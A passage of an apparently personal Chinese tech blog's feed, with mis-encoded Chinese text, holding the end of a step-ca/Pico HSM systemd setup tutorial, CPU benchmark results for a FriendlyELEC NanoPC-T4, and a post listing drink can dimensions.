class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/udev/rules.d/75-picohsm.rules &gt; /dev/null &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">ACTION==&quot;add&quot;, SUBSYSTEM==&quot;usb&quot;, ENV&#123;PRODUCT&#125;==&quot;20a0/4230/*&quot;, TAG+=&quot;systemd&quot;, SYMLINK+=&quot;picohsm&quot;</span></span><br><span class="line"><span class="string">ACTION==&quot;remove&quot;, SUBSYSTEM==&quot;usb&quot;, ENV&#123;PRODUCT&#125;==&quot;20a0/4230/*&quot;, TAG+=&quot;systemd&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">$ <span class="built_in">sudo</span> udevadm control --reload-rules</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/systemd/system/step-ca.service &gt; /dev/null &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=step-ca</span></span><br><span class="line"><span class="string">BindsTo=dev-picohsm.device</span></span><br><span class="line"><span class="string">After=dev-picohsm.device</span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">User=step</span></span><br><span class="line"><span class="string">Group=step</span></span><br><span class="line"><span class="string">ExecStart=/bin/sh -c &#x27;/usr/local/bin/step-ca /etc/step-ca/config/ca.json&#x27;</span></span><br><span class="line"><span class="string">Type=simple</span></span><br><span class="line"><span class="string">Restart=on-failure</span></span><br><span class="line"><span class="string">RestartSec=10</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">mkdir</span> /etc/systemd/system/dev-picohsm.device.wants</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">ln</span> -s /etc/systemd/system/step-ca.service /etc/systemd/system/dev-picohsm.device.wants/</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line">$ <span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> step-ca</span><br><span class="line">$ <span class="built_in">sudo</span> init 6</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æœåŠ¡è¿è¡ŒçŠ¶æ€</span></span><br><span class="line">$ systemctl status step-ca</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ï¼ˆå®Œï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h3&gt;&lt;p&gt;å‰å‡ å¤©åœ¨Canokeyç¾¤çœ‹åˆ°ä¸€ä¸ªè½¯ä»¶ï¼š&lt;a href=&quot;https://github.com/smallstep/certificates&quot;&gt;step-ca&lt;/a&gt;&lt;br&gt;ç®€å•è¯´å°±æ˜¯ç”¨è¿™ä¸ªè½¯ä»¶å¯ä»¥è‡ªå»ºä¸€ä¸ªCAæ¥ç©ï¼Œè€Œä¸”è½¯ä»¶æ”¯æŒHSMè®¾å¤‡&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;ç¯å¢ƒç¡®è®¤&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒç¡®è®¤&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒç¡®è®¤&quot;&gt;&lt;/a&gt;ç¯å¢ƒç¡®è®¤&lt;/h3&gt;&lt;p&gt;ç¡¬ä»¶ä¿¡æ¯ï¼š&lt;br&gt;&amp;emsp;&amp;emsp;OrangePi Zero3&lt;br&gt;&amp;emsp;&amp;emsp;Raspberry Pi Pico2&lt;br&gt;æ“ä½œç³»ç»Ÿï¼š&lt;br&gt;&amp;emsp;&amp;emsp;Armbian v25.11.2 6.12.58-current-sunxi64&lt;br&gt;è½¯ä»¶ç‰ˆæœ¬ï¼š&lt;br&gt;&amp;emsp;&amp;emsp;go1.25.5&lt;br&gt;&amp;emsp;&amp;emsp;step-ca 0.29.0&lt;br&gt;&amp;emsp;&amp;emsp;OpenSC 0.26.1  &lt;/p&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>å‹å–„ FriendlyELEC NanoPC-T4 CPUè·‘åˆ†æµ‹è¯• CPU Benchmark</title>
    <link href="https://thinkalone.win/NanoPC-T4-CPU-Benchmark.html"/>
    <id>https://thinkalone.win/NanoPC-T4-CPU-Benchmark.html</id>
    <published>2025-09-30T04:00:00.000Z</published>
    <updated>2025-09-30T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>CPU:Rockchip RK3399<br>RAM:4G  </p><p>screenfetch  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">       _,met$$$$$gg.           disappear9@nanopct4</span><br><span class="line">    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm</span><br><span class="line">  ,g$$P&quot;&quot;       &quot;&quot;&quot;Y$$.&quot;.      Kernel: aarch64 Linux 6.12.44-current-rockchip64</span><br><span class="line"> ,$$P&#x27;              `$$$.      Uptime: 15m</span><br><span class="line">&#x27;,$$P       ,ggs.     `$$b:    Packages: 366</span><br><span class="line">`d$$&#x27;     ,$P&quot;&#x27;   .    $$$     Shell: bash</span><br><span class="line"> $$P      d$&#x27;     ,    $$P     Disk: 4.8G / 485G (2%)</span><br><span class="line"> $$:      $$.   -    ,d$$&#x27;     CPU: ARM Cortex-A53 Cortex-A72 @ 6x 1.416GHz</span><br><span class="line"> $$\;      Y$b._   _,d$P&#x27;      RAM: 4G</span><br><span class="line"> Y$$.    `.`&quot;Y$$$$P&quot;&#x27;</span><br><span class="line"> `$$b      &quot;-.__</span><br><span class="line">  `Y$$</span><br><span class="line">   `Y$$.</span><br><span class="line">     `$$b.</span><br><span class="line">       `Y$$b.</span><br><span class="line">          `&quot;Y$b._</span><br><span class="line">              `&quot;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>7-zip 16.02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">disappear9@nanopct4:~$ 7z b -mmt6</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: 64000000 64000000 - - - - - - -</span><br><span class="line"></span><br><span class="line">RAM size:    3852 MB,  # CPU hardware threads:   6</span><br><span class="line">RAM usage:   1323 MB,  # Benchmark threads:      6</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:       4995   493    986   4860  |      93784   520   1538   7998</span><br><span class="line">23:       4735   503    960   4825  |      91755   520   1527   7940</span><br><span class="line">24:       4721   542    937   5077  |      89873   520   1517   7888</span><br><span class="line">25:       4656   574    926   5316  |      87341   519   1497   7773</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:             528    952   5019  |              520   1520   7900</span><br><span class="line">Tot:             524   1236   6460</span><br><span class="line">disappear9@nanopct4:~$ 7z b -mmt1</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: - - - - - - 512000000 1024000000 -</span><br><span class="line"></span><br><span class="line">RAM size:    3852 MB,  # CPU hardware threads:   6</span><br><span class="line">RAM usage:    435 MB,  # Benchmark threads:      1</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:       1629    99   1598   1585  |      22693   100   1943   1938</span><br><span class="line">23:       1535    99   1579   1565  |      22323   100   1938   1932</span><br><span class="line">24:       1466    99   1590   1576  |      21931   100   1931   1925</span><br><span class="line">25:       1355    99   1562   1548  |      21440   100   1915   1908</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:              99   1582   1568  |              100   1932   1926</span><br><span class="line">Tot:              99   1757   1747</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>phoronix-test-suite benchmark compress-7zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">disappear9@nanopct4:~$ ./phoronix-test-suite benchmark compress-7zip</span><br><span class="line"></span><br><span class="line">    pts/compress-7zip-1.12.0:</span><br><span class="line"></span><br><span class="line">System Information</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  PROCESSOR:              ARMv8 Cortex-A72 @ 1.42GHz</span><br><span class="line">    Core Count:           4</span><br><span class="line">    Thread Count:         6</span><br><span class="line">    Scaling Driver:       cpufreq-dt ondemand</span><br><span class="line"></span><br><span class="line">  GRAPHICS:</span><br><span class="line"></span><br><span class="line">  MOTHERBOARD:            FriendlyElec NanoPC-T4</span><br><span class="line">    Chipset:              Rockchip RK3399</span><br><span class="line"></span><br><span class="line">  MEMORY:                 4096MB</span><br><span class="line"></span><br><span class="line">  DISK:                   512GB SK hynix HFS512GDE9X084N + 16GB AJTD4R</span><br><span class="line">    File-System:          ext4</span><br><span class="line">    Mount Options:        commit=120 errors=remount-ro noatime rw</span><br><span class="line">    Disk Scheduler:       NONE</span><br><span class="line">    Disk Details:         Block Size: 4096</span><br><span class="line"></span><br><span class="line">  OPERATING SYSTEM:       Debian 12</span><br><span class="line">    Kernel:               6.12.44-current-rockchip64 (aarch64)</span><br><span class="line">    Compiler:             GCC 12.2.0</span><br><span class="line">    Security:             gather_data_sampling: Not affected</span><br><span class="line">                          + indirect_target_selection: Not affected</span><br><span class="line">                          + itlb_multihit: Not affected</span><br><span class="line">                          + l1tf: Not affected</span><br><span class="line">                          + mds: Not affected</span><br><span class="line">                          + meltdown: Not affected</span><br><span class="line">                          + mmio_stale_data: Not affected</span><br><span class="line">                          + reg_file_data_sampling: Not affected</span><br><span class="line">                          + retbleed: Not affected</span><br><span class="line">                          + spec_rstack_overflow: Not affected</span><br><span class="line">                          + spec_store_bypass: Not affected</span><br><span class="line">                          + spectre_v1: Mitigation of __user pointer sanitization</span><br><span class="line">                          + spectre_v2: Vulnerable: Unprivileged eBPF enabled</span><br><span class="line">                          + srbds: Not affected</span><br><span class="line">                          + tsa: Not affected</span><br><span class="line">                          + tsx_async_abort: Not affected</span><br><span class="line"></span><br><span class="line">7-Zip Compression 25.00:</span><br><span class="line">    pts/compress-7zip-1.12.0</span><br><span class="line">    Test 1 of 1</span><br><span class="line">    Estimated Trial Run Count:    3</span><br><span class="line">    Estimated Time To Completion: 4 Minutes [10:29 UTC]</span><br><span class="line">        Started Run 1 @ 10:25:56</span><br><span class="line">        Started Run 2 @ 10:27:30</span><br><span class="line">        Started Run 3 @ 10:29:03</span><br><span class="line"></span><br><span class="line">    Test: Compression Rating:</span><br><span class="line">        6156</span><br><span class="line">        6193</span><br><span class="line">        6134</span><br><span class="line"></span><br><span class="line">    Average: 6161 MIPS</span><br><span class="line">    Deviation: 0.48%</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sysbench  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">disappear9@nanopct4:~$ sysbench cpu --cpu-max-prime=20000 --threads=6 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 6</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:  2498.63</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0029s</span><br><span class="line">    total number of events:              25002</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    1.42</span><br><span class="line">         avg:                                    2.40</span><br><span class="line">         max:                                   16.88</span><br><span class="line">         95th percentile:                        3.62</span><br><span class="line">         sum:                                59998.36</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           4167.0000/1956.22</span><br><span class="line">    execution time (avg/stddev):   9.9997/0.00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">disappear9@nanopct4:~$ sysbench cpu --cpu-max-prime=20000 --threads=1 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:   692.27</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0012s</span><br><span class="line">    total number of events:              6926</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    1.42</span><br><span class="line">         avg:                                    1.44</span><br><span class="line">         max:                                   12.87</span><br><span class="line">         95th percentile:                        1.44</span><br><span class="line">         sum:                                 9997.66</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           6926.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   9.9977/0.00</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CPU:Rockchip RK3399&lt;br&gt;RAM:4G  &lt;/p&gt;
&lt;p&gt;screenfetch  &lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;       _,met$$$$$gg.           disappear9@nanopct4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ,g$$P&amp;quot;&amp;quot;       &amp;quot;&amp;quot;&amp;quot;Y$$.&amp;quot;.      Kernel: aarch64 Linux 6.12.44-current-rockchip64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ,$$P&amp;#x27;              `$$$.      Uptime: 15m&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x27;,$$P       ,ggs.     `$$b:    Packages: 366&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;`d$$&amp;#x27;     ,$P&amp;quot;&amp;#x27;   .    $$$     Shell: bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$P      d$&amp;#x27;     ,    $$P     Disk: 4.8G / 485G (2%)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$:      $$.   -    ,d$$&amp;#x27;     CPU: ARM Cortex-A53 Cortex-A72 @ 6x 1.416GHz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$&#92;;      Y$b._   _,d$P&amp;#x27;      RAM: 4G&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; Y$$.    `.`&amp;quot;Y$$$$P&amp;quot;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; `$$b      &amp;quot;-.__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `Y$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   `Y$$.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     `$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       `Y$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          `&amp;quot;Y$b._&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              `&amp;quot;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/categories/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/tags/%E6%9D%82%E9%A1%B9/"/>
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/tags/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§ç‰©å“å°ºå¯¸è®°å½•</title>
    <link href="https://thinkalone.win/Common-Item-Sizes.html"/>
    <id>https://thinkalone.win/Common-Item-Sizes.html</id>
    <published>2025-06-01T04:00:00.000Z</published>
    <updated>2025-06-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›å¸¸è§ç‰©å“çš„å°ºå¯¸æ•°æ®ï¼Œé»˜è®¤å•ä½ä¸ºæ¯«ç±³(mm)<br>æœ€åæ›´æ–°æ—¥æœŸï¼š 2025&#x2F;06&#x2F;01<br>ç°æœ‰æ•°æ®ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ˜“æ‹‰ç½ï¼š  </span><br><span class="line">330mL/11.6 imp fl oz/11.2 us fl oz  </span><br><span class="line">330mL/High/é«˜/æ‘©ç™»ç½  </span><br><span class="line">473mL/16.6 imp fl oz/16 us fl oz  </span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="æ˜“æ‹‰ç½ï¼š"><a href="#æ˜“æ‹‰ç½ï¼š" class="headerlink" title="æ˜“æ‹‰ç½ï¼š"></a>æ˜“æ‹‰ç½ï¼š</h2><h3 id="330mL"><a href="#330mL" class="headerlink" title="330mL"></a>330mL</h3><p><img src="/pictures/Common-Item-Sizes/Cans/330ml-D.png" alt="330ml-D.png"><br><img src="/pictures/Common-Item-Sizes/Cans/330ml-D2.png" alt="330ml-D2.png"><br><img src="/pictures/Common-Item-Sizes/Cans/330ml-H.png" alt="330ml-H.png">  </p><h3 id="330mL-High"><a href="#330mL-High" class="headerlink" title="330mL High"></a>330mL High</h3><p><img src="/pictures/Common-Item-Sizes/Cans/330ml-tall-D.png" alt="330ml-tall-D.png"><br><img src="/pictures/Common-Item-Sizes/Cans/330ml-tall-D2.png" alt="330ml-tall-D2.png"><br><img src="/pictures/Common-Item-Sizes/Cans/330ml-tall-H.png" alt="330ml-tall-H.png">  </p><h3 id="473mL-16oz"><a href="#473mL-16oz" class="headerlink" title="473mL 16oz"></a>473mL 16oz</h3><p><img src="/pictures/Common-Item-Sizes/Cans/473ml-D.png" alt="473ml-D.png"><br><img src="/pictures/Common-Item-Sizes/Cans/473ml-D2.png" alt="473ml-D2.png"><br><img src="/pictures/Common-Item-Sizes/Cans/473ml-H.png" alt="473ml-H.png"><br><img src="/pictures/Common-Item-Sizes/Cans/473ml-H2.png" alt="473ml-H2.png">  </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€äº›å¸¸è§ç‰©å“çš„å°ºå¯¸æ•°æ®ï¼Œé»˜è®¤å•ä½ä¸ºæ¯«ç±³(mm)&lt;br&gt;æœ€åæ›´æ–°æ—¥æœŸï¼š 2025&amp;#x2F;06&amp;#x2F;01&lt;br&gt;ç°æœ‰æ•°æ®ï¼š  &lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;æ˜“æ‹‰ç½ï¼š  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;330mL/11.6 imp fl oz/11.2 us fl oz  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;330mL/High/é«˜/æ‘©ç™»ç½  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;473mL/16.6 imp fl oz/16 us fl oz  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>æ ‘è“æ´¾5 Raspberry Pi 5 CPUè·‘åˆ†æµ‹è¯• CPU Benchmark</title>
    <link href="https://thinkalone.win/RPi5-CPU-Benchmark.html"/>
    <id>https://thinkalone.win/RPi5-CPU-Benchmark.html</id>
    <published>2025-03-10T04:00:00.000Z</published>
    <updated>2025-03-10T04:00:00.000Z</updated>
    
